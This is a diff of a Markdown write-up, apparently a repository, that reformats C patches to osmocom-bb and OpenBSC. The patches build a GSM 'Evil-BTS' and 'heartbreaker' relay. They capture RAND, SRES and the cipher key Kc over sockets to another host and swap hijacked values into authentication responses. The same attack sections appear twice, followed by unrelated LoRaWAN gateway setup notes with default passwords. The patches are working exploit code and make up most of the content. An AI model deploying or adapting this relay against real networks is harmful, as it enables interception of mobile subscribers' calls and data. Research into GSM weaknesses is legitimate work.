   outc = c -'0';
-  if (outc > 9) /* A - F or a - f */
-outc -= 7;  /* A - F */
-  if (outc > 15)/* a - f? */
-outc -= 32;
+  if (outc > 9)                                 /* A - F or a - f */
+    outc -= 7;                                  /* A - F */
+  if (outc > 15)                                /* a - f? */
+    outc -= 32;
   if ((outc > 15) || (outc < 0))
   {
-fprintf (stderr, "Invalid character %c, aborting\n", c);
-exit (1);
+    fprintf (stderr, "Invalid character %c, aborting\n", c);
+    exit (1);
   }
   return outc;
 }
@@ -774,21 +829,21 @@ const unsigned char* hex2ascii(char hexval[])
 
   for (arg = 0; arg < 17; arg++)
   {
-sl = strlen (c);
-if (sl & 1) /* odd length */
-{
-  fprintf (stderr,
-   "%s is %d chars long, must be even\n",
-   c,
-   sl );
-  return "prout";
-}int i=0;
-while (*c)
-{
-  oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
-  fputc (oc, stdout);
-  strcat(ascii,&oc);
-}
+    sl = strlen (c);
+    if (sl & 1)                                 /* odd length */
+    {
+      fprintf (stderr,
+               "%s is %d chars long, must be even\n",
+               c,
+               sl );
+      return "prout";
+    }int i=0;
+    while (*c)
+    {
+      oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
+      fputc (oc, stdout);
+      strcat(ascii,&oc);
+    }
   }
 return ascii;}
 ```
@@ -821,7 +876,7 @@ void client(char buffer[]){
   info.ai_socktype = SOCK_STREAM;
 
   if(0 != getaddrinfo("172.17.0.3", "888", &info, &result))
-exit(1);
+    exit(1);
 
   /* Connects to bound socket on the server */  
   connect(sock_fd, result->ai_addr, result->ai_addrlen);
@@ -865,32 +920,32 @@ char* catch_sres(){
 
   /* Translates IP, port, protocal into struct */
   if(0 !=  getaddrinfo("0.0.0.0", "666", &directives, &result))
-exit(1);
+    exit(1);
 
   /* Binds socket to port, so we know where new connections form */
   if(bind(sock_fd, result->ai_addr, result->ai_addrlen) != 0)
-  exit(1);
+      exit(1);
   /* Places socket to "listen" or "wait for stuff" state */
   if(listen(sock_fd, 10) != 0)
-  exit(1);
+      exit(1);
   int i=0;
   printf("Waiting for connection on http://0.0.0.0:666 ...\n");
   while(i==0){
 
-/* Accepts Connection */
-char buffer[1000];
-int client_fd = accept(sock_fd, NULL, NULL); 
-int len = read(client_fd, buffer, 999);
-buffer[len] = '\0';
+    /* Accepts Connection */
+    char buffer[1000];
+    int client_fd = accept(sock_fd, NULL, NULL); 
+    int len = read(client_fd, buffer, 999);
+    buffer[len] = '\0';
 
-char * header = "<b>You Connected to the Server!</b></br></br>";
-i=i+1;
-write(client_fd, header, strlen(header));
+    char * header = "<b>You Connected to the Server!</b></br></br>";
+    i=i+1;
+    write(client_fd, header, strlen(header));
 
-printf("=== Client Sent ===\n");
-printf("%s\n", buffer);
-memcpy(text,buffer,13);
-close(client_fd);
+    printf("=== Client Sent ===\n");
+    printf("%s\n", buffer);
+    memcpy(text,buffer,13);
+    close(client_fd);
 
   }
   return text;
@@ -928,9 +983,9 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/
 
  void mm_conn_free(struct gsm48_mm_conn *conn);
 @@ -1662,6 +1663,15 @@
- */
-if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
-no_sim = 1;
+     */
+    if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+        no_sim = 1;
 +   char test2[]="1";
 +   sprintf(test2, "%d", ar->key_seq);
 +   char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
@@ -940,9 +995,9 @@ no_sim = 1;
 +   strcat(test,test3);
 +   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);
 +   client(test);
-gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+    gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
 
-/* wait for auth response event from SIM */
+    /* wait for auth response event from SIM */
 diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c
 --- osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:38:53.125893570 +0200
 +++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c   2022-08-30 15:35:55.476598075 +0200
@@ -960,30 +1015,30 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
   * if list is changed, the result is not written back to SIM */
 @@ -945,14 +950,21 @@
 
-/* store sequence */
-subscr->key_seq = key_seq;
--   memcpy(subscr->key, vec->kc, 8);
+        /* store sequence */
+        subscr->key_seq = key_seq;
+-       memcpy(subscr->key, vec->kc, 8);
 +
 
-LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
-+char *h4ck3d_kc;
-+h4ck3d_kc = catch_kc();
-+const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
-+   char *h4ck3d_sres;
-+   h4ck3d_sres = catch_sres();
-+   const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
-+   memcpy(subscr->key, my_h4ck3d_kc, 8);
-nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
--   if (!nmsg)
--   return -ENOMEM;
-nmme = (struct gsm48_mm_event *) nmsg->data;
--   memcpy(nmme->sres, vec->sres, 4);
-+   memcpy(nmme->sres,my_h4ck3d_sres, 4);
-+   LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
-+   LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
-gsm48_mmevent_msg(ms, nmsg);
+        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
++                char *h4ck3d_kc;
++                h4ck3d_kc = catch_kc();
++                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
++       char *h4ck3d_sres;
++       h4ck3d_sres = catch_sres();
++           const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
++       memcpy(subscr->key, my_h4ck3d_kc, 8);
+        nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
+-       if (!nmsg)
+-           return -ENOMEM;
+        nmme = (struct gsm48_mm_event *) nmsg->data;
+-       memcpy(nmme->sres, vec->sres, 4);
++           memcpy(nmme->sres,my_h4ck3d_sres, 4);
++       LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
++       LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
+        gsm48_mmevent_msg(ms, nmsg);
 
-return 0;
+        return 0;
 ```
 
 # Genuine-MS (Kc Forwarding)
@@ -1000,15 +1055,15 @@ diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/
 --- trx/src/host/layer23/src/mobile/gsm48_mm.c  2022-08-30 16:41:37.076916961 +0200
 +++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:51:17.267099639 +0200
 @@ -1651,6 +1651,7 @@
- */
-if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
-no_sim = 1;
+     */
+    if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+        no_sim = 1;
 +   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar->rand,16));  
-gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+    gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
 
-/* wait for auth response event from SIM */
+    /* wait for auth response event from SIM */
 diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c
---- trx/src/host/layer23/src/mobile/subscriber.c2022-08-30 16:41:37.076916961 +0200
+--- trx/src/host/layer23/src/mobile/subscriber.c    2022-08-30 16:41:37.076916961 +0200
 +++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:51:17.267099639 +0200
 @@ -32,7 +32,7 @@
  #include <osmocom/bb/common/sap_proto.h>
@@ -1021,48 +1076,48 @@ diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer2
  //#define TEST_EMPTY_FPLMN
 @@ -369,6 +369,7 @@
 
-/* key */
-memcpy(subscr->key, data, 8);
+    /* key */
+    memcpy(subscr->key, data, 8);
 +   //client(osmo_hexdump(subscr->key,8));
 
-/* key sequence */
-subscr->key_seq = data[8] & 0x07;
+    /* key sequence */
+    subscr->key_seq = data[8] & 0x07;
 @@ -907,7 +908,7 @@
-struct msgb *nmsg;
-struct sim_hdr *nsh;
+    struct msgb *nmsg;
+    struct sim_hdr *nsh;
 
 -   /* not a SIM */
 +   /* not a SIM
-if (!GSM_SIM_IS_READER(subscr->sim_type)
- || !subscr->sim_valid || no_sim) {
-struct gsm48_mm_event *nmme;
+    if (!GSM_SIM_IS_READER(subscr->sim_type)
+     || !subscr->sim_valid || no_sim) {
+        struct gsm48_mm_event *nmme;
 @@ -944,6 +945,7 @@
 
-/* store sequence */
-subscr->key_seq = key_seq;
-+   //client(osmo_hexdump(vec->kc,8));
-memcpy(subscr->key, vec->kc, 8);
+        /* store sequence */
+        subscr->key_seq = key_seq;
++       //client(osmo_hexdump(vec->kc,8));
+        memcpy(subscr->key, vec->kc, 8);
 
-LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
+        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
 @@ -969,6 +971,7 @@
 
-/* random */
-memcpy(msgb_put(nmsg, 16), rand, 16);
+    /* random */
+    memcpy(msgb_put(nmsg, 16), rand, 16);
 +   LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);
 
-/* store sequence */
-subscr->key_seq = key_seq;
+    /* store sequence */
+    subscr->key_seq = key_seq;
 @@ -1019,7 +1022,9 @@
-nsh->file = 0x6f20;
-data = msgb_put(nmsg, 9);
-memcpy(data, subscr->key, 8);
+    nsh->file = 0x6f20;
+    data = msgb_put(nmsg, 9);
+    memcpy(data, subscr->key, 8);
 -   data[8] = subscr->key_seq;
-+LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
++        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
 +   client(osmo_hexdump(subscr->key,8));
 +   data[8] = subscr->key;
-sim_job(ms, nmsg);
+    sim_job(ms, nmsg);
 
-/* return signed response */
+    /* return signed response */
 ```
 
 # Patch OpenBSC Evil-BTS:
@@ -1088,10 +1143,10 @@ diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_
  void *tall_authciphop_ctx;
 
 @@ -908,6 +911,20 @@
-struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
-struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
-struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
-+DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
+    struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
+    struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
+    struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
++        DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
 +   
 +
 +
@@ -1103,14 +1158,14 @@ struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar))
 +   char *kandy_seq=strtok(NULL,"-");
 +   printf("key_seq %s\n",kandy_seq);
 +   char *randy_magnum = spaces(randy);
-+const unsigned char *randynator=hex2ascii(randy_magnum);
-+memcpy(rand,randynator,16);
++        const unsigned char *randynator=hex2ascii(randy_magnum);
++        memcpy(rand,randynator,16);
 
-DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
-if (autn)
+    DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
+    if (autn)
 @@ -917,7 +934,7 @@
-gh->proto_discr = GSM48_PDISC_MM;
-gh->msg_type = GSM48_MT_MM_AUTH_REQ;
+    gh->proto_discr = GSM48_PDISC_MM;
+    gh->msg_type = GSM48_MT_MM_AUTH_REQ;
 
 -   ar->key_seq = key_seq;
 +   ar->key_seq = kandy_seq;
@@ -1411,17 +1466,17 @@ Thank for reading !
 
 ## Clients-servers architecture :
 
-bsc-2rfa 172.17.0.2
-server rand 888 listen on 0.0.0.0
-client sres 666 -> 172.17.0.3
+    bsc-2rfa 172.17.0.2
+    server rand 888 listen on 0.0.0.0
+    client sres 666 -> 172.17.0.3
 
-bb-2rfa 172.17.0.3
-client rand 888 -> 172.17.0.2
-server sres 666 listen on 0.0.0.0
-server kc 777 listen on 0.0.0.0
+    bb-2rfa 172.17.0.3
+    client rand 888 -> 172.17.0.2
+    server sres 666 listen on 0.0.0.0
+    server kc 777 listen on 0.0.0.0
 
-osmocom-genuine-ms 172.17.0.2
-client kc 777 -> 172.17.0.3
+    osmocom-genuine-ms 172.17.0.2
+    client kc 777 -> 172.17.0.3
 
 ## Headers :
 
@@ -1433,15 +1488,15 @@ char res[100];
 char* spaces(char str [])
 {
 int i = 0;int j = 0;
-   while (str[i] != '\0')
-   {
-  if ((str[i] == ' ') != 1) {
-res[j] = str[i];
-j++;
-  }
-  i++;
-   }
-   res[j] = '\0';
+       while (str[i] != '\0')
+       {
+          if ((str[i] == ' ') != 1) {
+            res[j] = str[i];
+            j++;
+          }
+          i++;
+       }
+       res[j] = '\0';
 return res;}
 ```
 
@@ -1466,14 +1521,14 @@ char hexdigit (char c)
   char outc;
 
   outc = c -'0';
-  if (outc > 9) /* A - F or a - f */
-outc -= 7;  /* A - F */
-  if (outc > 15)/* a - f? */
-outc -= 32;
+  if (outc > 9)                                 /* A - F or a - f */
+    outc -= 7;                                  /* A - F */
+  if (outc > 15)                                /* a - f? */
+    outc -= 32;
   if ((outc > 15) || (outc < 0))
   {
-fprintf (stderr, "Invalid character %c, aborting\n", c);
-exit (1);
+    fprintf (stderr, "Invalid character %c, aborting\n", c);
+    exit (1);
   }
   return outc;
 }
@@ -1486,21 +1541,21 @@ const unsigned char* hex2ascii(char hexval[])
 
   for (arg = 0; arg < 17; arg++)
   {
-sl = strlen (c);
-if (sl & 1) /* odd length */
-{
-  fprintf (stderr,
-   "%s is %d chars long, must be even\n",
-   c,
-   sl );
-  return "prout";
-}int i=0;
-while (*c)
-{
-  oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
-  fputc (oc, stdout);
-  strcat(ascii,&oc);
-}
+    sl = strlen (c);
+    if (sl & 1)                                 /* odd length */
+    {
+      fprintf (stderr,
+               "%s is %d chars long, must be even\n",
+               c,
+               sl );
+      return "prout";
+    }int i=0;
+    while (*c)
+    {
+      oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
+      fputc (oc, stdout);
+      strcat(ascii,&oc);
+    }
   }
 return ascii;}
 ```
@@ -1533,7 +1588,7 @@ void client(char buffer[]){
   info.ai_socktype = SOCK_STREAM;
 
   if(0 != getaddrinfo("172.17.0.3", "888", &info, &result))
-exit(1);
+    exit(1);
   
   /* Connects to bound socket on the server */  
   connect(sock_fd, result->ai_addr, result->ai_addrlen);
@@ -1577,32 +1632,32 @@ char* catch_sres(){
 
   /* Translates IP, port, protocal into struct */
   if(0 !=  getaddrinfo("0.0.0.0", "666", &directives, &result))
-exit(1);
+    exit(1);
  
   /* Binds socket to port, so we know where new connections form */
   if(bind(sock_fd, result->ai_addr, result->ai_addrlen) != 0)
-  exit(1);
+      exit(1);
   /* Places socket to "listen" or "wait for stuff" state */
   if(listen(sock_fd, 10) != 0)
-  exit(1);
+      exit(1);
   int i=0;
   printf("Waiting for connection on http://0.0.0.0:666 ...\n");
   while(i==0){
    
-/* Accepts Connection */
-char buffer[1000];
-int client_fd = accept(sock_fd, NULL, NULL); 
-int len = read(client_fd, buffer, 999);
-buffer[len] = '\0';
-
-char * header = "<b>You Connected to the Server!</b></br></br>";
-i=i+1;
-write(client_fd, header, strlen(header));
-
-printf("=== Client Sent ===\n");
-printf("%s\n", buffer);
-memcpy(text,buffer,13);
-close(client_fd);
+    /* Accepts Connection */
+    char buffer[1000];
+    int client_fd = accept(sock_fd, NULL, NULL); 
+    int len = read(client_fd, buffer, 999);
+    buffer[len] = '\0';
+    
+    char * header = "<b>You Connected to the Server!</b></br></br>";
+    i=i+1;
+    write(client_fd, header, strlen(header));
+    
+    printf("=== Client Sent ===\n");
+    printf("%s\n", buffer);
+    memcpy(text,buffer,13);
+    close(client_fd);
 
   }
   return text;
@@ -1640,9 +1695,9 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/
  
  void mm_conn_free(struct gsm48_mm_conn *conn);
 @@ -1662,6 +1663,15 @@
- */
-if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
-no_sim = 1;
+     */
+    if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+        no_sim = 1;
 +   char test2[]="1";
 +   sprintf(test2, "%d", ar->key_seq);
 +   char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
@@ -1652,9 +1707,9 @@ no_sim = 1;
 +   strcat(test,test3);
 +   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);
 +   client(test);
-gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+    gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
  
-/* wait for auth response event from SIM */
+    /* wait for auth response event from SIM */
 diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c
 --- osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:38:53.125893570 +0200
 +++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c   2022-08-30 15:35:55.476598075 +0200
@@ -1672,30 +1727,30 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
   * if list is changed, the result is not written back to SIM */
 @@ -945,14 +950,21 @@
  
-/* store sequence */
-subscr->key_seq = key_seq;
--   memcpy(subscr->key, vec->kc, 8);
+        /* store sequence */
+        subscr->key_seq = key_seq;
+-       memcpy(subscr->key, vec->kc, 8);
 +
  
-LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
-+char *h4ck3d_kc;
-+h4ck3d_kc = catch_kc();
-+const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
-+   char *h4ck3d_sres;
-+   h4ck3d_sres = catch_sres();
-+   const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
-+   memcpy(subscr->key, my_h4ck3d_kc, 8);
-nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
--   if (!nmsg)
--   return -ENOMEM;
-nmme = (struct gsm48_mm_event *) nmsg->data;
--   memcpy(nmme->sres, vec->sres, 4);
-+   memcpy(nmme->sres,my_h4ck3d_sres, 4);
-+   LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
-+   LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
-gsm48_mmevent_msg(ms, nmsg);
+        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
++                char *h4ck3d_kc;
++                h4ck3d_kc = catch_kc();
++                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
++       char *h4ck3d_sres;
++       h4ck3d_sres = catch_sres();
++           const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
++       memcpy(subscr->key, my_h4ck3d_kc, 8);
+        nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
+-       if (!nmsg)
+-           return -ENOMEM;
+        nmme = (struct gsm48_mm_event *) nmsg->data;
+-       memcpy(nmme->sres, vec->sres, 4);
++           memcpy(nmme->sres,my_h4ck3d_sres, 4);
++       LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
++       LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
+        gsm48_mmevent_msg(ms, nmsg);
  
-return 0;
+        return 0;
 ```
 
 ## Genuine-MS (Kc Forwarding)
@@ -1712,15 +1767,15 @@ diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/
 --- trx/src/host/layer23/src/mobile/gsm48_mm.c  2022-08-30 16:41:37.076916961 +0200
 +++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:51:17.267099639 +0200
 @@ -1651,6 +1651,7 @@
- */
-if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
-no_sim = 1;
+     */
+    if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+        no_sim = 1;
 +   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar->rand,16));  
-gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+    gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
  
-/* wait for auth response event from SIM */
+    /* wait for auth response event from SIM */
 diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c
---- trx/src/host/layer23/src/mobile/subscriber.c2022-08-30 16:41:37.076916961 +0200
+--- trx/src/host/layer23/src/mobile/subscriber.c    2022-08-30 16:41:37.076916961 +0200
 +++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:51:17.267099639 +0200
 @@ -32,7 +32,7 @@
  #include <osmocom/bb/common/sap_proto.h>
@@ -1733,48 +1788,48 @@ diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer2
  //#define TEST_EMPTY_FPLMN
 @@ -369,6 +369,7 @@
  
-/* key */
-memcpy(subscr->key, data, 8);
+    /* key */
+    memcpy(subscr->key, data, 8);
 +   //client(osmo_hexdump(subscr->key,8));
  
-/* key sequence */
-subscr->key_seq = data[8] & 0x07;
+    /* key sequence */
+    subscr->key_seq = data[8] & 0x07;
 @@ -907,7 +908,7 @@
-struct msgb *nmsg;
-struct sim_hdr *nsh;
+    struct msgb *nmsg;
+    struct sim_hdr *nsh;
  
 -   /* not a SIM */
 +   /* not a SIM
-if (!GSM_SIM_IS_READER(subscr->sim_type)
- || !subscr->sim_valid || no_sim) {
-struct gsm48_mm_event *nmme;
+    if (!GSM_SIM_IS_READER(subscr->sim_type)
+     || !subscr->sim_valid || no_sim) {
+        struct gsm48_mm_event *nmme;
 @@ -944,6 +945,7 @@
  
-/* store sequence */
-subscr->key_seq = key_seq;
-+   //client(osmo_hexdump(vec->kc,8));
-memcpy(subscr->key, vec->kc, 8);
+        /* store sequence */
+        subscr->key_seq = key_seq;
++       //client(osmo_hexdump(vec->kc,8));
+        memcpy(subscr->key, vec->kc, 8);
  
-LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
+        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
 @@ -969,6 +971,7 @@
  
-/* random */
-memcpy(msgb_put(nmsg, 16), rand, 16);
+    /* random */
+    memcpy(msgb_put(nmsg, 16), rand, 16);
 +   LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);
  
-/* store sequence */
-subscr->key_seq = key_seq;
+    /* store sequence */
+    subscr->key_seq = key_seq;
 @@ -1019,7 +1022,9 @@
-nsh->file = 0x6f20;
-data = msgb_put(nmsg, 9);
-memcpy(data, subscr->key, 8);
+    nsh->file = 0x6f20;
+    data = msgb_put(nmsg, 9);
+    memcpy(data, subscr->key, 8);
 -   data[8] = subscr->key_seq;
-+LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
++        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
 +   client(osmo_hexdump(subscr->key,8));
 +   data[8] = subscr->key;
-sim_job(ms, nmsg);
+    sim_job(ms, nmsg);
  
-/* return signed response */
+    /* return signed response */
 ```
 
 ## Patch OpenBSC Evil-BTS:
@@ -1800,10 +1855,10 @@ diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_
  void *tall_authciphop_ctx;
  
 @@ -908,6 +911,20 @@
-struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
-struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
-struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
-+DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
+    struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
+    struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
+    struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
++        DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
 +   
 +
 +
@@ -1815,14 +1870,14 @@ struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar))
 +   char *kandy_seq=strtok(NULL,"-");
 +   printf("key_seq %s\n",kandy_seq);
 +   char *randy_magnum = spaces(randy);
-+const unsigned char *randynator=hex2ascii(randy_magnum);
-+memcpy(rand,randynator,16);
++        const unsigned char *randynator=hex2ascii(randy_magnum);
++        memcpy(rand,randynator,16);
  
-DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
-if (autn)
+    DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
+    if (autn)
 @@ -917,7 +934,7 @@
-gh->proto_discr = GSM48_PDISC_MM;
-gh->msg_type = GSM48_MT_MM_AUTH_REQ;
+    gh->proto_discr = GSM48_PDISC_MM;
+    gh->msg_type = GSM48_MT_MM_AUTH_REQ;
  
 -   ar->key_seq = key_seq;
 +   ar->key_seq = kandy_seq;
@@ -2044,12 +2099,12 @@ port 1700 nécessaire à l'établissement de la connection routeur -\>
 TheThingsNetwork.
 
 -   Plug on sector the gateway with USB-C 5V-2A a WiFi network
-dragino-XXXXXX apparait.
+    dragino-XXXXXX apparait.
 -   Connect to it via the password "dragino+dragino"
 -   Go on the webbrowser on IP 10.130.1.1 an Id/Pwd is asked by the
-dragino (by default) "root" / "dragino"
+    dragino (by default) "root" / "dragino"
 -   Connect via the WiFi Mesh the dragino as a client to your smartphone
-or your box for example
+    or your box for example
 
 [![WiFi_Dragino](assets/WiFi_Dragino.png)](assets/WiFi_Dragino.png)
 
@@ -2058,8 +2113,8 @@ or your box for example
 -   Create a thethingsnetwork account (free, need email)
 -   We can see the Gateway EUI on the LoRa tab of the network interface
 -   We have to choose now TheThingsNetwork v3 on the defilant menu
-beside (the thingsnetwork v is avaible but not deserved for new
-gateways on TTN)
+    beside (the thingsnetwork v is avaible but not deserved for new
+    gateways on TTN)
 -   On the second defilant menu choose eu1.cloud.thethings.network
 
 [![config_gw_ttn](assets/config_gw_ttn.png)](assets/config_gw_ttn.png)
@@ -2174,12 +2229,12 @@ DEVICES=“/dev/ttyAMA0”
 GPSD_OPTIONS=“-n”
 
 
-Now we add to /boot/config.txt those lines at the end
+    Now we add to /boot/config.txt those lines at the end
 
-``` {.sourceCode .}
-enable_uart=1
-dtoverlay=miniuart-bt
-dtoverlay=spi-gpio-cs
+    ``` {.sourceCode .}
+    enable_uart=1
+    dtoverlay=miniuart-bt
+    dtoverlay=spi-gpio-cs
 
 We modify /boot/cmdline.txt to make it looks like
 
@@ -2210,7 +2265,7 @@ Then we write in /home/pi/dragino : test_cayenne.py like
 ``` sourceCode
 #!/usr/bin/env python3
 """
-Test harness for dragino module - sends hello world out over LoRaWAN 5 times
+    Test harness for dragino module - sends hello world out over LoRaWAN 5 times
 """
 import logging
 from datetime import datetime
@@ -2242,16 +2297,16 @@ logging.basicConfig(filename="test.log", format='%(asctime)s - %(funcName)s - %(
 D = Dragino("/home/pi/dragino/dragino.ini", logging_level=logLevel)
 D.join()
 while not D.registered():
-print("Waiting for JOIN ACCEPT")
-sleep(2)
+    print("Waiting for JOIN ACCEPT")
+    sleep(2)
 for i in range(0, 2):
-D.send_bytes(sent)
-start = datetime.utcnow()
-while D.transmitting:
-pass
-end = datetime.utcnow()
-print("Sent GPS coordinates ({})".format(end-start))
-sleep(1)
+    D.send_bytes(sent)
+    start = datetime.utcnow()
+    while D.transmitting:
+        pass
+    end = datetime.utcnow()
+    print("Sent GPS coordinates ({})".format(end-start))
+    sleep(1)
 ```
 
 We take now /home/pi/dragino/dragino.ini.default to rewrite it to
@@ -2274,13 +2329,13 @@ appeui = 0x70, 0xB3, 0xD5, 0x00, 0x00, 0xD5, 0xB3, 0x70 appkey = 0x3D,
 0x54, 0x36, 0xB7
 
 
